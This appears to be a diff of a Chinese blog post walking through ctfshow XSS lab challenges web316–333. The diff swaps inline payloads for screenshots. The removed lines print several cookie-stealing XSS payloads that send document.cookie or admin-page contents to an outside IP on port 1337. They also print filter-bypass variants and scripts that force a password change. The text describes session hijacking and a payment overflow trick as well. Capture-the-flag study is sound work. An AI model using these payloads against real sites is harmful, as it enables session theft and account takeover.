@@ -15,12 +15,20 @@
 <meta property="og:site_name" content="MiGooli&#39;s Blog">
 <meta property="og:description" content="开X！">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9d88fbe669514c92aea4958147b92ae1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/929556ee88c6455f9b79406f9bb84f36.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3c7c3031cc8d45b29481527ef81027b1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2ba62974c5ee47839b05e70a4e03457b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ea19252a362747f58f1fc02b1e79fdc0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/04b6d051eabf4afda602655d2a199280.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/182f8de73810429bb61bb056e9c3fe9a.png">
 <meta property="article:published_time" content="2022-07-20T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-08-17T10:10:30.964Z">
+<meta property="article:modified_time" content="2022-08-17T12:24:46.563Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="web入门">
 <meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/9d88fbe669514c92aea4958147b92ae1.png">
   
     <link rel="alternative" href="/atom.xml" title="MiGooli&#39;s Blog" type="application/atom+xml">
   
@@ -191,46 +199,25 @@
         <p>开X！<br><span id="more"></span></p>
 <h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>反射型XSS，先在自己的VPS上用nc监听端口，然后输入payload即可</p>
 <p>PS：如果第一次没X成功的话，就多X几次，记得在X之前把cookie删了！！！</p>
-<blockquote>
-<script>document.location.href='http://120.76.203.6:1337/'+document.cookie;</script>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/9d88fbe669514c92aea4958147b92ae1.png" alt="在这里插入图片描述"></p>
 <h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script，利用input标签进行绕过</p>
-<blockquote>
-<input onfocus="window.open('http://120.76.203.6:1337/'+document.cookie)" autofocus>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/929556ee88c6455f9b79406f9bb84f36.png" alt="在这里插入图片描述"></p>
 <h1 id="web318、319"><a href="#web318、319" class="headerlink" title="web318、319"></a>web318、319</h1><p>不知道过滤了啥，上面的payload照样可以用</p>
 <h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>过滤了空格，利用<strong>/</strong>进行绕过</p>
-<blockquote>
-<input/onfocus="window.open('http://120.76.203.6:1337/'+document.cookie)"/autofocus>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/3c7c3031cc8d45b29481527ef81027b1.png" alt="在这里插入图片描述"></p>
 <h1 id="web321-326"><a href="#web321-326" class="headerlink" title="web321-326"></a>web321-326</h1><p>不知道过滤了，上面的payload通杀</p>
 <h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>存储型XSS，测试了一下，只有收件人为admin时才会显示登录成功，那么就在“信的内容”里面填写XSSpayload，在VPS上成功拿到flag</p>
-<blockquote>
-<input/onfocus="window.open('http://120.76.203.6:1337/'+document.cookie)"/autofocus>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2ba62974c5ee47839b05e70a4e03457b.png" alt="在这里插入图片描述"></p>
 <h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>有注册功能，尝试在注册的时候填入payload，然后利用payload进行登录，发现VPS上返回的只有cookie，没有flag</p>
 <p>点击用户管理功能，提示非admin无法查看，盲猜可以通过修改cookie冒充admin，将cookie的值改成VPS中返回的cookie，成功变成admin拿到flag</p>
 <h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>328的方法不能用了，查了下大佬博客说是拿到cookie后会立即失效，所以不能通过修改cookie冒充admin了</p>
 <p>但是可以直接读取admin页面的内容，flag会直接返回VPS</p>
-<blockquote>
-<script>window.open('http://120.76.203.6:1337/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/ea19252a362747f58f1fc02b1e79fdc0.png" alt="在这里插入图片描述"></p>
 <h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>多了个修改密码的功能，抓个包，发现修改密码的文件路径为/api/change.php?p=123123，直接开X，注意这边X的地址是本机地址，不是VPS</p>
 <p>在注册页面的用户名填入payload，然后用admin和重置的密码登录即可拿到flag</p>
-<blockquote>
-<script>window.open('http://127.0.0.1/api/change.php?p=123123')</script>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/04b6d051eabf4afda602655d2a199280.png" alt="在这里插入图片描述"></p>
 <h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>330的修改密码是GET请求，331的修改密码是POST请求，通过JQuery来发送POST请求即可，做法同330</p>
-<blockquote>
-<script>$.post("http:/127.0.0.1/api/change.php",{p:123123},"json");</script>
-
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/182f8de73810429bb61bb056e9c3fe9a.png" alt="在这里插入图片描述"></p>
 <h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>好像和XSS没什么关系，是支付的代码逻辑漏洞，正常注册登录后进行转账，转账过程抓个包，把转账人改成admin，转账进行改成-99999999999999999999，整数溢出后钱数就变成正的，直接购买flag</p>
 <h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>好像和XSS也没什么关系，给自己转多少钱就会拿到多少钱，只要转账金额不超过余额即可，多转几次即可拿到flag</p>
 
